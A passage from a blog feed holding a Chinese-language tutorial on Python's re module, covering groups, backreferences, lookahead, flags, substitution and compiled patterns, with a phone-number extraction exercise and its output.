class="string">要实现分组很简单，使用()即可。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a = re.search(<span class="string">r&#x27;([\d]&#123;4&#125;)-([\d]&#123;7&#125;)&#x27;</span>,<span class="string">&#x27;张三：0731-8825951&#x27;</span>) <span class="comment">#未使用分组</span></span><br><span class="line">print(a.group())</span><br><span class="line">print(a.groups())</span><br><span class="line">print(a.group(<span class="number">1</span>))</span><br><span class="line">print(a.group(<span class="number">2</span>))</span><br></pre></td></tr></table></figure><pre><code>0731-8825951(&#39;0731&#39;, &#39;8825951&#39;)07318825951</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#练习 识别中国电话号码</span></span><br><span class="line"><span class="comment">#中国区号码规则如下： (+)86-0XX（0XXX）-XXX-XXXX（XXXX-XXXX）</span></span><br><span class="line">phone=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">+86-010-82866931</span></span><br><span class="line"><span class="string">86010-82866931</span></span><br><span class="line"><span class="string">010 8286 6931</span></span><br><span class="line"><span class="string">86(010)-69675217</span></span><br><span class="line"><span class="string">86(0731)-728-3333</span></span><br><span class="line"><span class="string">(0731)-2728-3353</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#请你使用正则表达式将这些号码提取成分组形式</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#命名分组</span></span><br><span class="line"><span class="comment">#一个命名分组的语法是在开始的“(”之后，添加?P&lt;group_name&gt;，来实现分组，例如：</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">a = re.search(<span class="string">r&#x27;[\d]&#123;4&#125;-[\d]&#123;7&#125;&#x27;</span>,<span class="string">&#x27;张三：0731-8825951&#x27;</span>)</span><br><span class="line">b = re.search(<span class="string">r&#x27;(?P&lt;first_group&gt;[\d]&#123;4&#125;)-(?P&lt;second_group&gt;[\d]&#123;7&#125;)&#x27;</span>,<span class="string">&#x27;张三：0731-8825951&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line">print(a.group)</span><br><span class="line">print(a.groups)</span><br><span class="line">print(<span class="string">&quot; -&quot;</span>*<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">print(b)</span><br><span class="line">print(b.group())</span><br><span class="line">print(b.groups())</span><br><span class="line">print(b.group(<span class="number">0</span>))</span><br><span class="line">print(b.group(<span class="number">1</span>))</span><br><span class="line">print(b.group(<span class="number">2</span>))</span><br><span class="line">print(<span class="string">&quot; -&quot;</span>*<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">print(b.group(<span class="string">&#x27;first_group&#x27;</span>))</span><br><span class="line">print(b.group(<span class="string">&#x27;second_group&#x27;</span>))</span><br><span class="line">print(b.groupdict())</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">re.search()方法返回的是一个re.Match对象，运行上述例子我们可以发现，使用 ?P&lt;group_name&gt; 可以实现分组， </span></span><br><span class="line"><span class="string">使用 .group(group_name)将分组名传入group()函数可以获取对应名称分组的数据，同样使用索引 也是可以获取对应分组的数据的。</span></span><br><span class="line"><span class="string">Match对象还提供了一个groupdict()方法，该方法在和groups()方法类似，不过它返回的是一个字典，而groups()放回的是一个元祖。</span></span><br><span class="line"><span class="string">不过值得注意的是：groupdict()只会返回命名分组而不会返回非命名分组</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">match = re.search(<span class="string">r&#x27;(?P&lt;first_group&gt;[\d]&#123;4&#125;)-([\d]&#123;7&#125;)&#x27;</span>,<span class="string">&#x27;张三：0731-8825951&#x27;</span>) <span class="comment">#使用分组</span></span><br><span class="line">print(match.group())</span><br><span class="line">print(match.groups())</span><br><span class="line">print(match.groupdict())</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">在上述例子中，只有第一个是命名分组，第二个是编码分组，所以当调用groups()时，</span></span><br><span class="line"><span class="string">这两个分组都在元祖中返回，但是，当调用groupdict时，这两个分组则只有命名分组被返回了，</span></span><br><span class="line"><span class="string">如果从可维护的角度来说，命名分组十分有价值</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><pre><code>&lt;re.Match object; span=(3, 15), match=&#39;0731-8825951&#39;&gt;&lt;built-in method group of re.Match object at 0x0000016EDCFF0B90&gt;&lt;built-in method groups of re.Match object at 0x0000016EDCFF0B90&gt; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -&lt;re.Match object; span=(3, 15), match=&#39;0731-8825951&#39;&gt;0731-8825951(&#39;0731&#39;, &#39;8825951&#39;)0731-882595107318825951 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -07318825951&#123;&#39;first_group&#39;: &#39;0731&#39;, &#39;second_group&#39;: &#39;8825951&#39;&#125;0731-8825951(&#39;0731&#39;, &#39;8825951&#39;)&#123;&#39;first_group&#39;: &#39;0731&#39;&#125;&#39;\n在上述例子中，只有第一个是命名分组，第二个是编码分组，所以当调用groups()时，\n这两个分组都在元祖中返回，但是，当调用groupdict时，这两个分组则只有命名分组被返回了，\n如果从可维护的角度来说，命名分组十分有价值\n\n&#39;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 引用已经存在的分组</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">正则表达式还提供了一种引用一个之前匹配分组的机制，有些时候，我们或许会寻找到一个子匹配，该匹配会接下来再次出现。</span></span><br><span class="line"><span class="string">例如，如果我们尝试解析一段XML代码，比如：&lt;font&gt;提示&lt;/font&gt;，我们可能会编写出这样一段代码：</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a = re.search(<span class="string">r&#x27;&lt;[\w_-]+&gt;提示&lt;/[\w_-]+&gt;&#x27;</span>,<span class="string">&#x27;&lt;font&gt;提示&lt;/font&gt;&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#上述代码确实可以匹配，不过也存在另一种情况，如果解析的是如下数据：&lt;font&gt;提示&lt;/bar&gt;</span></span><br><span class="line">b = re.search(<span class="string">r&#x27;&lt;([\w_-]+)&gt;提示&lt;(/[\w_-]+)&gt;&#x27;</span>,<span class="string">&#x27;&lt;font&gt;提示&lt;/bar&gt;&#x27;</span>)</span><br><span class="line">print(b)</span><br><span class="line">print(b.group(<span class="number">1</span>))</span><br><span class="line">print(b.group(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot; -&quot;</span>*<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#这个时候我们可能直觉的想让后面分组的正则也匹配font，不过实际情况确是，</span></span><br><span class="line"><span class="comment">#所有形式的都会匹配，那如果我们想让后面的正则和第一个分组的正则该如何做呢？</span></span><br><span class="line"><span class="comment">#可以使用分组引用，使用\N即可回溯引用编号为N的分组，因此上述例子的代码我们可以改为：</span></span><br><span class="line"></span><br><span class="line">a = re.search(<span class="string">r&#x27;&lt;([\w_-]+)&gt;提示&lt;/\1&gt;&#x27;</span>,<span class="string">&#x27;&lt;font&gt;提示&lt;/bar&gt;&#x27;</span>)</span><br><span class="line">b = re.search(<span class="string">r&#x27;&lt;([\w_-]+)&gt;提示&lt;/\1&gt;&#x27;</span>,<span class="string">&#x27;&lt;font&gt;提示&lt;/font&gt;&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line">print(b.group())</span><br><span class="line">print(b.groups())</span><br><span class="line"><span class="comment">#通过上面的例子，我们可以发现回溯引用取代了第二个分组。所以与font不同的就无法匹配了；</span></span><br><span class="line"><span class="comment">#值的注意的是：这里只是一个作为介绍回溯引用的例子，</span></span><br><span class="line"><span class="comment">#在实际开发中我们不应该用这种方式去解析XML文档，可以使用beautifulSoap等包去解析XML文件</span></span><br></pre></td></tr></table></figure><pre><code>&lt;re.Match object; span=(0, 15), match=&#39;&lt;font&gt;提示&lt;/font&gt;&#39;&gt;&lt;re.Match object; span=(0, 14), match=&#39;&lt;font&gt;提示&lt;/bar&gt;&#39;&gt;font/bar - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -None&lt;font&gt;提示&lt;/font&gt;(&#39;font&#39;,)</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#先行断言</span></span><br><span class="line">a = re.findall(<span class="string">r&#x27;n(?!e)&#x27;</span>,<span class="string">&#x27;final&#x27;</span>)</span><br><span class="line">b = re.findall(<span class="string">r&#x27;n(?!e)&#x27;</span>,<span class="string">&#x27;python&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line">print(<span class="string">&quot; -&quot;</span> * <span class="number">30</span>)</span><br><span class="line"><span class="comment">#正向先行断言</span></span><br><span class="line">c = re.findall(<span class="string">r&#x27;n(?=e)&#x27;</span>,<span class="string">&#x27;final&#x27;</span>)</span><br><span class="line">d = re.findall(<span class="string">r&#x27;n(?=e)&#x27;</span>,<span class="string">&#x27;python&#x27;</span>)</span><br><span class="line">e = re.findall(<span class="string">r&#x27;n(?=e)&#x27;</span>,<span class="string">&#x27;jasmine&#x27;</span>)</span><br><span class="line">print(c)</span><br><span class="line">print(d)</span><br><span class="line">print(e)</span><br></pre></td></tr></table></figure><pre><code>[&#39;n&#39;][&#39;n&#39;] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -[][][&#39;n&#39;]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#标记，不区分大小写</span></span><br><span class="line"><span class="comment">#最简单直接的标记是 re.IGNORECASE，他会导致正则表达式变为不区分大小写</span></span><br><span class="line">a = re.search(<span class="string">r&#x27;python&#x27;</span>,<span class="string">&#x27;I LIKE PYTHON&#x27;</span>,re.IGNORECASE)</span><br><span class="line">b = re.search(<span class="string">r&#x27;python&#x27;</span>,<span class="string">&#x27;I LIKE PYTHON&#x27;</span>,re.I)</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line">print(<span class="string">&quot; -&quot;</span> * <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#点匹配换行符</span></span><br><span class="line"><span class="comment">#re.DOTALL标记（别名为re.S）可以让 .字符除了匹配其他字符之外，还匹配换行符。</span></span><br><span class="line">a = re.search(<span class="string">r&#x27;.+&#x27;</span>,<span class="string">&#x27;hello\nworld&#x27;</span>)</span><br><span class="line">b = re.search(<span class="string">r&#x27;.+&#x27;</span>,<span class="string">&#x27;hello\nworld&#x27;</span>,re.S)</span><br><span class="line">c = re.search(<span class="string">r&#x27;.+&#x27;</span>,<span class="string">&#x27;hello\nworld&#x27;</span>,re.DOTALL)</span><br><span class="line"></span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line">print(c)</span><br><span class="line"><span class="comment">#详细模式</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">re.VERBOSE标记(别名为re.X)允许复杂的正则表达式以更容易的方式表示</span></span><br><span class="line"><span class="string">该标记做两件事，首先，他导致所有的空白（除了字符组中）被忽略，包括换行符。</span></span><br><span class="line"><span class="string">其次，它将#字符（同样，除非在字符组内）当做注释字符</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#调试模式</span></span><br><span class="line"><span class="comment">#re.DEBUG 标记（没有别名）在编译正则表达式时将一些调试信息输出到sys.stderr</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">使用多个标记</span></span><br><span class="line"><span class="string">可能我们还需要同时使用多个标记，为了完成这点，可以使用|操作符。</span></span><br><span class="line"><span class="string">正确的语法是例如：re.DOTALL|re.MULTILINE 或 re.S | re.M</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#内联标记</span></span><br><span class="line">print(<span class="string">&quot; -&quot;</span> * <span class="number">30</span>)</span><br><span class="line">f = re.search(<span class="string">&#x27;(?i)Foo&#x27;</span>,<span class="string">&#x27;foo&#x27;</span>)</span><br><span class="line">print(f)</span><br><span class="line"><span class="comment">#可以发现这里的(?i)，就等同于使用re.IGNORECASE 标记。</span></span><br></pre></td></tr></table></figure><pre><code>&lt;re.Match object; span=(7, 13), match=&#39;PYTHON&#39;&gt;&lt;re.Match object; span=(7, 13), match=&#39;PYTHON&#39;&gt; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -&lt;re.Match object; span=(0, 5), match=&#39;hello&#39;&gt;&lt;re.Match object; span=(0, 11), match=&#39;hello\nworld&#39;&gt;&lt;re.Match object; span=(0, 11), match=&#39;hello\nworld&#39;&gt; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -&lt;re.Match object; span=(0, 3), match=&#39;foo&#39;&gt;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#替换</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">正则表达式引擎并不仅仅局限于识别一个模式是否在字符串中存在，它还能够执行字符串替换，基于在原始字符串中的分组返回一个新字符串。</span></span><br><span class="line"><span class="string">Python中的替换方法是re.sub，他接收三个参数，正则表达式，用于替换的字符串，被搜索的字符串。</span></span><br><span class="line"><span class="string">只要实际匹配被替换，如果没有匹配，则re.sub最终不执行任何操作。</span></span><br><span class="line"><span class="string">re.sub允许从被替换的字符串中的正则表达式模式使用同样的回溯引用，接下来我们看一个从电话号码中剥离无关格式数据的任务</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a = re.sub(<span class="string">r&#x27;[\d]+&#x27;</span>,<span class="string">r&#x27;a&#x27;</span>,<span class="string">&#x27;213-667-8890&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line"><span class="comment"># 还可以利用sub的功能使所有的电话号码格式一致</span></span><br><span class="line">b = re.sub(<span class="string">r&#x27;(\+?1?)[ .-]?\(?([\d]&#123;3&#125;)\)?[ .-]?([\d]&#123;3&#125;)[ .-]?([\d]&#123;4&#125;)&#x27;</span>,<span class="string">r&#x27;(\2)\3-\4&#x27;</span>,<span class="string">&#x27;213-667-8890&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c = re.sub(<span class="string">r&#x27;(\+?1?)[ .-]?\(?([\d]&#123;3&#125;)\)?[ .-]?([\d]&#123;3&#125;)[ .-]?([\d]&#123;4&#125;)&#x27;</span>,<span class="string">r&#x27;(\2)\3-\4&#x27;</span>,<span class="string">&#x27;(213)8675509&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d = re.sub(<span class="string">r&#x27;(\+?1?)[ .-]?\(?([\d]&#123;3&#125;)\)?[ .-]?([\d]&#123;3&#125;)[ .-]?([\d]&#123;4&#125;)&#x27;</span>,<span class="string">r&#x27;(\2)\3-\4&#x27;</span>,<span class="string">&#x27;213.867.5509&#x27;</span>)</span><br><span class="line"></span><br><span class="line">e = re.sub(<span class="string">r&#x27;(\+?1?)[ .-]?\(?([\d]&#123;3&#125;)\)?[ .-]?([\d]&#123;3&#125;)[ .-]?([\d]&#123;4&#125;)&#x27;</span>,<span class="string">r&#x27;(\2)\3-\4&#x27;</span>,<span class="string">&#x27;+1-213-854-5557&#x27;</span>)</span><br><span class="line"></span><br><span class="line">f = re.sub(<span class="string">r&#x27;(\+?1?)[ .-]?\(?([\d]&#123;3&#125;)\)?[ .-]?([\d]&#123;3&#125;)[ .-]?([\d]&#123;4&#125;)&#x27;</span>,<span class="string">r&#x27;(\2)\3-\4&#x27;</span>,<span class="string">&#x27;1213-854-5557&#x27;</span>)</span><br><span class="line">print(b)</span><br><span class="line">print(c)</span><br><span class="line">print(d)</span><br><span class="line">print(e)</span><br><span class="line">print(f)</span><br></pre></td></tr></table></figure><pre><code>a-a-a(213)667-8890(213)867-5509(213)867-5509(213)854-5557(213)854-5557</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#已编译的正则表达式</span></span><br><span class="line"><span class="comment">#re模块包含一个函数：compile，它返回一个已编译的正则表达式对象，该对象之后可以被复用</span></span><br><span class="line">regex = re.compile(<span class="string">r&#x27;[\d]&#123;3,4&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">a = regex.search(<span class="string">&#x27;578&#x27;</span>)</span><br><span class="line">b = regex.search(<span class="string">&#x27;编号8975&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">使用已编译的正则表达式有两个好处：</span></span><br><span class="line"><span class="string">    可用于作为方法的参数被传递</span></span><br><span class="line"><span class="string">    允许使用在re.search允许使用在re.search中不可用的两个额外参数，</span></span><br><span class="line"><span class="string">    这两个参数分别是被搜索字符串的开始和结束位置，他们可用来减少对部分字符串的考虑</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">reg = re.compile(<span class="string">&#x27;[\d]+&#x27;</span>)</span><br><span class="line">c = reg.search(<span class="string">&#x27;1 编号89757,wuhhhhh&#x27;</span>)</span><br><span class="line">d = reg.search(<span class="string">&#x27;1 编号89757,wuhhhhh&#x27;</span>,pos=<span class="number">2</span>)</span><br><span class="line"><span class="comment">#pos：匹配的起始位置，可选，默认为0</span></span><br><span class="line"><span class="comment">#endpos：匹配的结束位置，可选，默认为 len(string)</span></span><br><span class="line">print(c)</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><pre><code>&lt;re.Match object; span=(0, 3), match=&#39;578&#39;&gt;&lt;re.Match object; span=(2, 6), match=&#39;8975&#39;&gt;&lt;re.Match object; span=(0, 1), match=&#39;1&#39;&gt;&lt;re.Match object; span=(4, 9), match=&#39;89757&#39;&gt;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#正则表达式练习</span></span><br><span class="line">str=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">张伟 86-14870293148  \n</span></span><br><span class="line"><span class="string">   王伟   +86-13285654569    \n</span></span><br><span class="line"><span class="string">    王芳        15856529115    \n</span></span><br><span class="line"><span class="string"> 李伟         13022816340  \n</span></span><br><span class="line"><span class="string">  王秀英   (86)14785720656     \n</span></span><br><span class="line"><span class="string">   李秀英    17201444672    \n</span></span><br><span class="line"><span class="string">    李娜         15682812452     \n</span></span><br><span class="line"><span class="string">    张秀英         14326967740     \n</span></span><br><span class="line"><span class="string">    刘伟  15146435743    \n</span></span><br><span class="line"><span class="string">   张敏        (86)-17712576838   \n</span></span><br><span class="line"><span class="string">    李静       86 14295083635  \n</span></span><br><span class="line"><span class="string">    张丽     (+86) 13722348123   \n</span></span><br><span class="line"><span class="string">   王静         17587918887   \n</span></span><br><span class="line"><span class="string">  王丽    15493106739    \n</span></span><br><span class="line"><span class="string"> 李强      13786842977   \n</span></span><br><span class="line"><span class="string"> 张静         86-15542304386     \n</span></span><br><span class="line"><span class="string">    李敏         15642387356 \n</span></span><br><span class="line"><span class="string">   王敏          18627216756  \n</span></span><br><span class="line"><span class="string"> 王磊       17206185726   \n</span></span><br><span class="line"><span class="string">    李军      17857426238     \n</span></span><br><span class="line"><span class="string">   刘洋        17345352790     \n</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#要求：</span></span><br><span class="line"><span class="comment"># 1.提取所有 11 位数字电话号码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.提取所有 18 或 13 开头的电话号码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.提取所有“王”姓同学的名字</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.提取所有“张”姓同学的电话号码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.重新排版，排版成统一的格式，去掉国家区号。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">a = re.findall(<span class="string">r&#x27;[\d]&#123;11&#125;&#x27;</span>,str)</span><br><span class="line"><span class="comment">#for i in a:</span></span><br><span class="line"><span class="comment">#    print(i)</span></span><br><span class="line">print(a)</span><br><span class="line">print(<span class="string">&quot; -&quot;</span> * <span class="number">30</span>)</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">b = re.findall(<span class="string">r&#x27;1[3|8][\d]&#123;9&#125;&#x27;</span>,str)</span><br><span class="line">print(b)</span><br><span class="line">print(<span class="string">&quot; -&quot;</span> * <span class="number">30</span>)</span><br><span class="line"><span class="comment">#3</span></span><br><span class="line">c = re.findall(<span class="string">r&#x27;王\S*&#x27;</span>,str)s</span><br><span class="line">print(c)</span><br><span class="line">print(<span class="string">&quot; -&quot;</span> * <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#4</span></span><br><span class="line">d = re.findall(<span class="string">r&#x27;(张\S*)\s+\(?(\+?86?)?\)?[ .-]?([\d]&#123;11&#125;)&#x27;</span>,str)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> d:</span><br><span class="line">    print(line[<span class="number">0</span>]+<span class="string">&quot;的电话是：&quot;</span>+line[<span class="number">2</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>[&#39;14870293148&#39;, &#39;13285654569&#39;, &#39;15856529115&#39;, &#39;13022816340&#39;, &#39;14785720656&#39;, &#39;17201444672&#39;, &#39;15682812452&#39;, &#39;14326967740&#39;, &#39;15146435743&#39;, &#39;17712576838&#39;, &#39;14295083635&#39;, &#39;13722348123&#39;, &#39;17587918887&#39;, &#39;15493106739&#39;, &#39;13786842977&#39;, &#39;15542304386&#39;, &#39;15642387356&#39;, &#39;18627216756&#39;, &#39;17206185726&#39;, &#39;17857426238&#39;, &#39;17345352790&#39;] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -[&#39;13285654569&#39;, &#39;13022816340&#39;, &#39;13722348123&#39;, &#39;13786842977&#39;, &#39;18627216756&#39;] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -[&#39;王伟&#39;, &#39;王芳&#39;, &#39;王秀英&#39;, &#39;王静&#39;, &#39;王丽&#39;, &#39;王敏&#39;, &#39;王磊&#39;] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -张伟的电话是：14870293148张秀英的电话是：14326967740张敏的电话是：17712576838张丽的电话是：13722348123张静的电话是：15542304386</code></pre><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><ul><li><a href="https://segmentfault.com/a/1190000018622193?utm_source=tag-newest">https://segmentfault.com/a/1190000018622193?utm_source=tag-newest</a></li><li><a href="https://deerchao.cn/tutorials/regex/regex.htm">https://deerchao.cn/tutorials/regex/regex.htm</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Python-gt-re&quot;&gt;&lt;a href=&quot;#Python-gt-re&quot; class=&quot;headerlink&quot; title=&quot;Python-&amp;gt;re&quot;&gt;&lt;/a&gt;Python-&amp;gt;re&lt;/h2&gt;&lt;p&gt;  之前想着玩爬虫，特意找一些大佬的文章学的，使用&lt;co</summary>
      
    
    
    
    <category term="Python" scheme="http://www.ywboy.cn/categories/Python/"/>
    
    
    <category term="正则表达式" scheme="http://www.ywboy.cn/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>PHP变量覆盖学习</title>
    <link href="http://www.ywboy.cn/2020/10/04/PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AD%A6%E4%B9%A0/"/>
    <id>http://www.ywboy.cn/2020/10/04/PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-10-04T01:08:31.000Z</published>
    <updated>2020-10-04T01:15:35.765Z</updated>
    
